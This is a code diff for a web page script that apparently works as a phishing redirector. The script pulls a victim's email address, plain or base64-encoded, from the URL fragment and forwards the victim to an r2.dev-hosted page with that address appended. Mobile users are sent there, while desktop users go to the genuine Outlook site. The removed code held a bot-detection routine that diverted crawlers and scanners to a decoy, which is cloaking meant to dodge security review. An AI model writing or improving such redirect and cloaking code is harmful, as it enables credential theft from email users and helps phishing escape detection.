@@ -90,15 +90,44 @@
         </noscript>
     </div>
 
-    <!-- Bot detection and redirect script -->
+    <!-- Simple device detection and redirect script -->
     <script>
     (function() {
-        // ===== BOT DETECTION VARIABLES =====
-        let botScore = 0;
-        const BOT_THRESHOLD = 3; // If score exceeds this, treat as bot
-        const REDIRECT_DELAY = 800 + Math.floor(Math.random() * 400); // 800-1200ms delay
+        const REDIRECT_DELAY = 800;
+
+        // Mobile device detection function
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
+        }
         
-        // ===== REDIRECT FUNCTION =====
+        // Check if string is a valid email
+        function isValidEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+        
+        // Try to decode base64 if needed, return the email
+        function getEmailFromFragment(fragment) {
+            // First check if the fragment itself is a valid email
+            if (isValidEmail(fragment)) {
+                return fragment;
+            }
+            
+            // Otherwise try to decode it as base64
+            try {
+                const decoded = atob(fragment);
+                if (isValidEmail(decoded)) {
+                    return decoded;
+                }
+            } catch (e) {
+                console.error("Failed to decode fragment as base64");
+            }
+            
+            // Return null if neither approach worked
+            return null;
+        }
+        
+        // Main redirect function
         function performRedirect() {
             // Get the fragment (everything after #)
             const fragment = window.location.hash.substring(1);
@@ -109,211 +138,31 @@
                 return;
             }
             
-            try {
-                // IMPORTANT: Decode the base64 email from the URL fragment
-                const decodedEmail = atob(fragment);
-                console.log("Decoded email:", decodedEmail);
-                
-                // Validate it looks like an email
-                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decodedEmail)) {
-                    console.error("Invalid email format after decoding");
-                    return;
-                }
-                
-                // Define your base redirect URL
-                const redirectBaseUrl = "https://pub-9e0d4cbac42840fea1fcf5889a823ce3.r2.dev/index.html#";
-                 
-                // Create the final URL with the DECODED email appended (NOT URL-encoded as requested)
-                const finalUrl = redirectBaseUrl + decodedEmail;
-                
-                // Only redirect if not detected as a bot
-                if (botScore < BOT_THRESHOLD) {
-                    console.log("Redirecting to:", finalUrl);
-                    // Redirect with decoded email (no token)
-                    window.location.href = finalUrl;
-                } else {
-                    // For bots, redirect to a decoy page or nowhere
-                    console.log("Bot detected, redirect prevented");
-                    window.location.href = "https://example.com/"; // Or to a honeypot page
-                }
-            } catch (error) {
-                console.error("Error decoding base64 email:", error);
+            // Get email from fragment (handles both raw and base64)
+            const email = getEmailFromFragment(fragment);
+            
+            if (!email) {
+                console.error("No valid email found in URL fragment");
+                return;
+            }
+            
+            console.log("Processing email:", email);
+            
+            // Check if the device is mobile
+            if (isMobileDevice()) {
+                // Redirect mobile devices to the original destination
+                const redirectUrl = "https://pub-9e0d4cbac42840fea1fcf5889a823ce3.r2.dev/index.html#" + email;
+                console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                window.location.href = redirectUrl;
+            } else {
+                // Redirect non-mobile devices to Outlook
+                console.log("Non-mobile device detected. Redirecting to Outlook.");
+                window.location.href = "https://outlook.office365.com/";
             }
         }
         
-        // ===== BOT DETECTION TECHNIQUES =====
-        
-        // 1. User-Agent check (basic)
-        function checkUserAgent() {
-            const ua = navigator.userAgent.toLowerCase();
-            const botPatterns = [
-                'bot', 'spider', 'crawl', 'phantomjs', 'headless', 
-                'selenium', 'puppeteer', 'chrome-lighthouse', 'wget',
-                'curl', 'scrape', 'archive.org', 'slurp', 'facebook',
-                'python-requests', 'java/', 'perl', 'ruby', 'phantomjs'
-            ];
-            
-            for (const pattern of botPatterns) {
-                if (ua.includes(pattern)) {
-                    botScore += 2;
-                    break;
-                }
-            }
-        }
-        
-        // 2. Browser capabilities check
-        function checkBrowserCapabilities() {
-            // Most bots don't process these properly
-            if (!navigator.cookieEnabled) botScore++;
-            if (navigator.webdriver) botScore += 2;
-            if (!('ontouchstart' in window)) botScore += 0.5;
-            if (!window.localStorage || !window.sessionStorage) botScore++;
-            
-            // Extremely limited or spoofed environments often have 0 plugins
-            if (navigator.plugins && navigator.plugins.length === 0) botScore += 0.5;
-        }
-        
-        // 3. Mouse movement check
-        function setupMouseCheck() {
-            let hasMouseMoved = false;
-            window.addEventListener('mousemove', function() {
-                hasMouseMoved = true;
-            });
-            
-            // After a delay, check if mouse has moved (humans usually move their mouse)
-            setTimeout(function() {
-                if (!hasMouseMoved) botScore += 1;
-            }, 500);
-        }
-        
-        // 4. Timing check (bots often execute too quickly)
-        function timingCheck() {
-            const startTime = performance.now();
-            
-            // Create an artificial computational task
-            let result = 0;
-            for (let i = 0; i < 10000; i++) {
-                result += Math.sin(i) * Math.cos(i);
-            }
-            
-            const elapsedTime = performance.now() - startTime;
-            
-            // If unreasonably fast, increase bot score
-            if (elapsedTime < 5) botScore += 2;
-        }
-        
-        // 5. Honeypot trap - create an invisible link that only a bot would "see"
-        function createHoneypot() {
-            const trap = document.createElement('a');
-            trap.href = "https://trap-for-bots-only.example.com";
-            trap.id = "secret-link";
-            trap.style.opacity = "0";
-            trap.style.position = "absolute";
-            trap.style.pointerEvents = "none"; // Humans can't click even accidentally
-            trap.innerHTML = "Click here for special access";
-            document.body.appendChild(trap);
-            
-            // If this link is followed, it's almost certainly a bot
-            trap.addEventListener('click', function() {
-                botScore += 5;
-                return false;
-            });
-            
-            // Also check if the element gets focus, another bot behavior
-            trap.addEventListener('focus', function() {
-                botScore += 3;
-            });
-        }
-        
-        // 6. Use storage to detect repeat visits patterns
-        function checkVisitPatterns() {
-            try {
-                // Get or create visit history
-                let visits = JSON.parse(localStorage.getItem('visit_history') || '[]');
-                const now = Date.now();
-                
-                // Add current visit
-                visits.push(now);
-                
-                // Only keep last 10 visits
-                if (visits.length > 10) visits = visits.slice(-10);
-                
-                // Save updated history
-                localStorage.setItem('visit_history', JSON.stringify(visits));
-                
-                // Calculate time differences
-                if (visits.length >= 3) {
-                    const intervals = [];
-                    for (let i = 1; i < visits.length; i++) {
-                        intervals.push(visits[i] - visits[i-1]);
-                    }
-                    
-                    // Check for suspiciously regular intervals (bots often run on schedules)
-                    let similarIntervals = 0;
-                    const threshold = 200; // ms tolerance
-                    
-                    for (let i = 1; i < intervals.length; i++) {
-                        if (Math.abs(intervals[i] - intervals[i-1]) < threshold) {
-                            similarIntervals++;
-                        }
-                    }
-                    
-                    // If most intervals are very similar, likely a bot
-                    if (similarIntervals > intervals.length * 0.7) {
-                        botScore += 2;
-                    }
-                    
-                    // Very frequent visits in short time
-                    if (visits.length > 5 && (now - visits[0]) < 60000) { // 5+ visits in a minute
-                        botScore += 2;
-                    }
-                }
-            } catch (e) {
-                // localStorage might be disabled
-            }
-        }
-        
-        // 7. Check if client accepts a token/cookie
-        function checkTokenStorage() {
-            try {
-                const testToken = "human_test_" + Math.random();
-                localStorage.setItem('verification_token', testToken);
-                
-                // Read it back immediately
-                const readToken = localStorage.getItem('verification_token');
-                
-                if (readToken !== testToken) {
-                    botScore += 2;
-                }
-            } catch (e) {
-                // If we can't use localStorage at all
-                botScore += 1;
-            }
-        }
-        
-        // ===== RUN ALL CHECKS =====
-        function runBotDetection() {
-            checkUserAgent();
-            checkBrowserCapabilities();
-            // setupMouseCheck();
-            timingCheck();
-            createHoneypot();
-            checkVisitPatterns();
-            checkTokenStorage();
-            
-            // Log the bot score (remove in production)
-            console.log("Bot detection score:", botScore);
-            
-            // Finally redirect after a slight delay
-            setTimeout(performRedirect, REDIRECT_DELAY);
-        }
-        
-        // Start detection when DOM is ready
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', runBotDetection);
-        } else {
-            runBotDetection();
-        }
+        // Execute redirect after a short delay
+        setTimeout(performRedirect, REDIRECT_DELAY);
     })();
     </script>
 </body>
